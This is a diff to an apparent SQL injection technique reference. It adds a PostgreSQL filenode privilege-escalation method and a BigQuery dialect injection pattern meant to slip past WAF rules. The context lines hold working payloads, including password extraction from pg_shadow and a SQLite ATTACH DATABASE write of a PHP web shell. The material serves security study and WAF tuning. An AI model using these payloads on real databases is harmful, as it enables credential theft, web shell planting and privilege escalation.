@@ -178,6 +178,7 @@ Mutations leveraging **proprietary functions, syntax, and system objects** uniqu
 | **pg_catalog Enumeration** | System catalog table querying | `' UNION SELECT usename,passwd FROM pg_shadow--` |
 | **CHR() Function Chaining** | String construction via CHR() concatenation | `CHR(65)||CHR(66)||CHR(67)` (= 'ABC') |
 | **UTF-8 Encoding Flaw** | Escape function bypass via malformed UTF-8 (CVE-2025-1094) | Invalid UTF-8 sequences causing psql statement splitting |
+| **Filenode Offline Manipulation** | With SELECT-only access, read `pg_relation_filenode()` to map table OIDs to physical file paths, then manipulate raw heap pages via `lo_import`/`lo_export` to rewrite role attributes (e.g., `rolsuper` flag in `pg_authid`), escalating to superuser and RCE (Phrack) | `SELECT pg_relation_filenode('pg_authid');` → offline page edit → role escalation |
 
 ### §3-3. Microsoft SQL Server-Specific Techniques
 
@@ -211,6 +212,12 @@ Mutations leveraging **proprietary functions, syntax, and system objects** uniqu
 | **RANDOMBLOB Time Delay** | Delay via massive random data generation | `' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--` |
 | **ATTACH DATABASE** | File write via new DB file creation | `'; ATTACH DATABASE '/var/www/shell.php' AS lol; CREATE TABLE lol.x(y text); INSERT INTO lol.x VALUES('<?php...');--` |
 | **typeof() / unicode()** | Type/character information extraction | `' AND unicode(substr(password,1,1))>64--` |
+
+### §3-6. Cloud Database-Specific Techniques
+
+| Subtype | Mechanism | Payload Example |
+|---------|-----------|-----------------|
+| **BigQuery Dialect Injection** | Google BigQuery uses non-standard SQL syntax (backtick-quoted identifiers, `SAFE_DIVIDE()`, `FORMAT()`, `UNNEST()`) that standard WAF rulesets tuned for MySQL/PostgreSQL/MSSQL fail to detect | `` SELECT * FROM `project.dataset.table` WHERE SAFE_DIVIDE(1,(SELECT IF(condition,1,0)))=1 `` |
 
 ---
 
@@ -598,3 +605,7 @@ No single defensive measure can cover the entire SQL Injection mutation space �
 | [20] | ModSecurity — Open Source Web Application Firewall Engine | https://github.com/owasp-modsecurity/ModSecurity |
 | [21] | OWASP Core Rule Set (CRS) — Generic Attack Detection Rules | https://github.com/coreruleset/coreruleset |
 | [22] | libinjection — SQL/SQLI Tokenizer Parser Analyzer | https://github.com/libinjection/libinjection |
+
+### Additional Research
+
+- Doyensec: "Apache Pinot SQLi and RCE Cheat Sheet" (2022) — SQL injection and remote code execution chains in Apache Pinot query engine
